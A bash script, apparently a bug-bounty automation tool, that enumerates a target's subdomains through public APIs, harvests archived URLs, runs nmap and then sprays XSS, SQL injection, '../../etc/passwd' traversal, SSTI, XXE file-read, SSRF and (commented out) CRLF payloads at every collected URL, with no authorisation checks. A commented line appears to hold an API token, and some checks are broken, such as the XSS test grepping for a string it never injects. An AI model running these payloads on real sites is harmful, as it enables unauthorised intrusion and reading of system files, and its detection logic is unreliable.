#!/bin/bash


echo "enter the target "
read target
echo "target is $target"
mkdir $target


subdomains ()
 {
    #echo "finding from assetfinder "
    #assetfinder --subs-only $target | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u | tee 1st-$target-subs.txt ;

    echo "finding from subfinder "
    subfinder -d $target -silent | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u >> 1st-$target-subs.txt ;

    #amass
    #amass enum -norecursive -noalts -passive -d $target -config /mnt/c/Users/nix/Desktop/Amass_Config.ini | grep -v '\*' | rev | cut -d. -f1-3 | rev | sort -u | tee -a 1st-$target-subs.txt > /dev/null

    #Findomain
    echo "finding from finddomain-linux "
    #findomain-linux -t $target -q | grep -v "\*" | rev | cut -d "." -f1-3 | rev | sort -u >> 1st-$target-subs.txt;

    #Second Level - Sub Enum...
    cat 1st-$target-subs.txt  | sort -u >> part-1.txt
    rm 1st-$target-subs.txt 
    #securitytrails
    #curl -s "https://api.securitytrails.com/v1/domain/$target/subdomains" --header "Accept: application/json" --header "apikey: <API_KEY>" | jq -r '.subdomains' | grep -v '\]\|\['| sed 's/\"//g'| sed -r 's/\,//g' | sed -z 's/\n/.'$target'\n/g' | awk '{print $1}' | sort -u > $target-sectrails_domains.txt

    #CRT.SH
    echo "finding from crt  "
    curl -s "https://crt.sh/?q=%25.$target&output=json"| jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$target" > $target-crt_domains.txt;

    #WAY-ARCHIVE
    echo "finding from web-archive  "
    curl -s "http://web.archive.org/cdx/search/cdx?url=*.$target/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' |sort -u > $target-warchive_domains.txt;

    #DNS-BUFFER
    echo "finding from Dns-buffer  "
    curl -s "https://dns.bufferover.run/dns?q=.$target" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$target" | sort -u > $target-dnsbuffer_domains.txt;
    curl -s "https://dns.bufferover.run/dns?q=.$target" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$target" | sort -u >> $target-dnsbuffer_domains.txt;
    curl -s "https://tls.bufferover.run/dns?q=.$target" | jq -r .Results 2>/dev/null | cut -d ',' -f3 |grep -o "\w.*$target"| sort -u >> $target-dnsbuffer_domains.txt;

    #Threatcrowd
    echo "finding from Threat-crowd "
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$target"|jq -r '.subdomains' 2>/dev/null |grep -o "\w.*$target" > $target-threatcrowd_domains.txt;

    #HackerTarget
    echo "finding from hacker-target  "
    curl -s "https://api.hackertarget.com/hostsearch/?q=$target"|grep -o "\w.*$target"> $target-hackertarget_domains.txt;

    #Certspotter
    echo "finding from cert-spotter  "
    curl -s "https://certspotter.com/api/v0/certs?domain=$target" | jq -r '.[].dns_names[]' 2>/dev/null | grep -o "\w.*$target" | sort -u > $target-certspotter_domains.txt;

    #anubisdb
    echo "finding from anubis  "
    curl -s "https://jldc.me/anubis/subdomains/$target" | jq -r '.' 2>/dev/null | grep -o "\w.*$target" > $target-anubisdb_domains.txt;

    #virustotal
    echo "finding from virustotal  "
    curl -s "https://www.virustotal.com/ui/domains/$target/subdomains?limit=40"|jq -r '.' 2>/dev/null |grep id|grep -o "\w.*$target"|cut -d '"' -f3|egrep -v " " > $target-virustotal_domains.txt;

    #alienvault
    echo "finding from alien-vault  "
    curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$target/passive_dns"|jq '.passive_dns[].hostname' 2>/dev/null |grep -o "\w.*$target"|sort -u > $target-alienvault_domains.txt;

    #urlscan
    echo "finding from urlscan  "
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$target"|jq '.results[].page.domain' 2>/dev/null |grep -o "\w.*$target"|sort -u > $target-urlscan_domains.txt;

   #threatminer
   echo "finding from theat-miner  "
   curl -s "https://api.threatminer.org/v2/domain.php?q=$target&rt=5" | jq -r '.results[]' 2>/dev/null |grep -o "\w.*$1"|sort -u > $target-threatminer_domains.txt;

    #entrust
    echo "finding from entrust  "
    curl -s "https://ctsearch.entrust.com/api/v1/certificates?fields=subjectDN&domain=$target&includeExpired=false&exactMatch=false&limit=5000" | jq -r '.[].subjectDN' 2>/dev/null |sed 's/cn=//g'|grep -o "\w.*$target"|sort -u > $target-entrust_domains.txt;

    #riddler
    echo "finding from riddler-1  "
    curl -s "https://riddler.io/search/exportcsv?q=pld:$target"| grep -o "\w.*$target"|awk -F, '{print $6}'|sort -u > $target-riddler_domains.txt;
    echo "finding from riddler-2  "
    curl -s "https://riddler.io/search/exportcsv?q=pld:$target"|cut -d "," -f6|grep $target|sort -u >> $target-riddler_domains.txt;

    #dnsdumpster
    echo "finding from Dns-dumpster-2  "
    cmdtoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";");
    curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$cmdtoken&targetip=$target" --cookie "csrftoken=$cmdtoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com > dnsdumpster.html
    cat dnsdumpster.html|grep "https://api.hackertarget.com/httpheaders"|grep -o "\w.*$target"|cut -d "/" -f7|sort -u > $target-dnsdumper_domains.txt
    rm dnsdumpster.html

    #rapiddns 
    echo "finding from rappid-dns  "
    curl -s "https://rapiddns.io/subdomain/$target?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $target | cut -d "/" -f3 | sort -u | grep -v "\*" > $target-rapiddns_domains.txt;

    #chaos
    echo "finding from chaos  "
    org=$(echo $target | cut -d. -f1)
    curl -sSfL "https://chaos-data.projectdiscovery.io/index.json" | grep "URL" | sed 's/"URL": "//;s/",//' | grep "$org" | while read host do;do curl -sSfL "$host" > /dev/null;done && for i in `ls -1 | grep .zip$`; do unzip $i > /dev/null; done && rm -f *.zip && cat $org*.txt | grep -v "\*" > $target-choas_domains.txt;

    cat *_domains.txt part-1.txt | grep -oE "[a-zA-Z0-9._-]+\.$target" | sort -u >> $target/subdomains.txt;
    rm *_domains.txt part-1.txt
    #cat subdomains.txt | rev | cut -d . -f 1-3 | rev | sort -u | grep -v '^[[:blank:]]*$' > root_subdomains.txt;

    #cat top-1000-subs.txt | cut -d"," -f2| grep -v "\# Generated\|\*" > /tmp/top-subs.txt
    #echo "finding from Dnscewl  \n";
    #~/Desktop/tool/subdomain-all/DNSCewl/DNScewl --tL root_subdomains.txt -p /tmp/top-subs.txt --level=0 --subs --no-color > subs-prepend-list.txt
    #echo "finding from puredns  \n";
    #~/Desktop/tool/subdomain-all/puredns/puredns resolve subs-prepend-list.txt -r resolvers.txt -w premut-subs_domains.txt
}


links ()
{

    echo "findings links for manual testing of various attacks \n"
    echo "finding url from gau"
    gau --subs $target --timeout 30 | tee -a $target/waybackurls.txt
    cat $target/waybackurls.txt | sort -u  | cut -d "?" -f 1 | cut -d "=" -f 1 > $target/filtered.txt
    #python3 /usr/bin/github-endpoints.py -d $target -t 29ac37f8ec9e04c4f9a368314673dc26c74bdf9f >> githubs.txt
    #check with httpx wheather any backups or similar files are there or not.
    grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" $target/filtered.txt | sort -u  > $target/leaks.txt   
    cat $target/waybackurls.txt | sort -u >> $target/all-links.txt
    rm $target/waybackurls.txt   

 }

nmaps ()
 {
    sudo nmap -sC -sV $target -oN $target/nmap.txt 
    

}


cleaning ()
 {
   echo "cleaning urls "
   cat $target/all-links.txt | egrep -iav -e "\.(png|jpg|jpeg|gif|pdf|svg|css|eot|woff|ttf|otf)"  -e "/svg" >> $target/cleaned_urls.txt;
   rm $target/all-links.txt
   cat $target/cleaned_urls.txt | grep -Ea '\?.*=(\/\/?\w+|\w+\/|\w+(%3A|:)(\/|%2F)|%2F|[\.\w]+\.\w{2,4}[^\w])' >> $target/lfi1.txt
   rm  $target/lfi1.txt

   #different language urls
   cat $target/cleaned_urls.txt |  grep -a ".js$" >> $target/all-js.txt
   cat $target/cleaned_urls.txt |  grep -a ".jsp$" >> $target/all-jsp.txt
   cat $target/cleaned_urls.txt |  grep -a ".php$" >> $target/all-php.txt
   cat $target/cleaned_urls.txt |  grep -a ".aspx$" >> $target/all-aspx.txt

}

xss ()
{

   
   echo ""
   cat $target/cleaned_urls.txt  | grep -a "=" | egrep -va ".js?" | qsreplace '"><script>alert(Shruti)</script>' > $target/xss.txt
   #clear;
   echo "testing xss "
   for i in $(cat $target/xss.txt ); do echo "testing" $i "for xss" && curl --silent --path-as-is --insecure  $i -m 5    2>/dev/null | grep -qas "alert(4)" && echo "vulnerable url is " " $i "  | tee -a  $target/xss_result.txt ;done;

}

sqli ()
{
    echo ""
   cat $target/cleaned_urls.txt | grep -a "=" | egrep -va ".js" |  uniq >> $target/sqli.txt;
   cat $target/sqli.txt | qsreplace "'" | uniq >> $target/sql.txt
   #clear;
   echo "testing sql "
   rm $target/sqli.txt
  for i in $(cat $target/sql.txt ); do echo "testing" $i "for sql" && curl -s $i -m 5 2>/dev/null | grep -iaEqs "line|\syntax|\Warning|\use+near|\use near|\SQL syntax|\Query failed:" && echo "vulnerable url is " "$i\n"  | tee -a  $target/sql_result.txt ;done;

}


lfi()
{
   for i in $(cat $target/cleaned_urls.txt); do echo $i | grep -a "?" | egrep -va ".js" | qsreplace "../../etc/passwd" | uniq >> $target/lfi_test.txt ; done;
   #clear
   echo ""
   echo "testing lfi "
   for i in $(cat $target/lfi_test.txt | sort | uniq ); do echo "testing" $i "for lfi " && curl -s "$i" -m 10 | grep -a "root" && echo "vulnerable url is" $i | grep "vulnerable url is" | tee -a $target/lfi_result.txt ; done;
}

ssti()
{
   echo ""
   echo "testing ssti"
   cat $target/cleaned_urls.txt | grep '=' | sort -u >> ssti.txt
   cat ssti.txt | qsreplace '${{3*3}}' | sort -u >> ssti-with-payload.txt 
   for i in $(cat ssti-with-payload.txt );do curl -s $i | grep  -iaEqs '9' && echo $i "might be vulenrable to ssti" | tee -a $target/final-ssti.txt;done;
   rm ssti.txt
}


#crlf()
#{
#	echo ""
#	echo "testing crlf "
#   URLS_FILE=$target/cleaned_urls.txt

## Loop through each URL in the file
#while read URL; do

#  # Send a GET request with a CRLF injection payload and extract the response headers
#  RESPONSE_HEADERS=$(curl -s -H "User-Agent: Mozilla/5.0%0d%0aLocation: evil.com%0d%0a%0d%0a" -I "$URL")

#  # Check if the response headers contain the Location header with the value "evil.com"
#  if [[ $RESPONSE_HEADERS == "Location: evil.com" ]]; then 
#    echo "The URL $URL is vulnerable to CRLF injection"  >> crlf.txt
#  else
#    echo "The URL $URL is not vulnerable to CRLF injection"  >> crlf-not.txt
#  fi

#done < "$URLS_FILE"
#}

ssrf()
{
	echo ""
   # Get the filename containing the URLs from command line argument
URLS_FILE=$target/cleaned_urls.txt

# Loop through each URL in the file
while read URL; do

  # Send a GET request with a local IP address as the parameter and extract the response body
  RESPONSE_BODY=$(curl -s "$URL?param=http://127.0.0.1")

	echo "testing ssrf "
  # Check if the response body contains any content that indicates an SSRF vulnerability	
  if [[ $RESPONSE_BODY == "localhost" || $RESPONSE_BODY == "127.0.0.1" ]]; then
    echo "The URL $URL is vulnerable to SSRF"  >> ssrf.txt
  else
    echo "The URL $URL is not vulnerable to SSRF"  >> ssrf-not.txt
  fi

done < "$URLS_FILE"
}

xml()
{
   cat $target/cleaned_urls.txt  | grep -a "=" | egrep -va ".js?" | qsreplace "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>" > $target/xml.txt
   echo "testing xml "
   for i in $(cat $target/xml.txt ); do echo "testing" $i "for xml" && curl --silent --path-as-is --insecure  $i -m 5    2>/dev/null | grep -qas "root:" && echo "vulnerable url is " " $i "  | tee -a  $target/xml_result.txt ;done;

}

Clickjack()
{
	echo ""
# Get the URL from command line argument

# Send a HEAD request to the URL and extract the X-Frame-Options header from the response
X_FRAME_OPTIONS=$(curl -s -I $target | grep -i '^x-frame-options:')

	echo "testing clickjacking "
# Check if the X-Frame-Options header is present in the response
if [[ -n $X_FRAME_OPTIONS ]]; then
	echo "$target is not vulnerable to clickjacking"
	else
		echo "$target is vulnerable to clickjacking"
		fi
		
}


Cors()
{

	python3 CORScanner/cors_scan.py -u $target
	
}
 

 


subdomains ;
links ;
nmaps ;
cleaning ;
xss ;
sqli ;
lfi ;
ssti ;
ssrf ;
xml ;
Clickjack ;
Cors ;
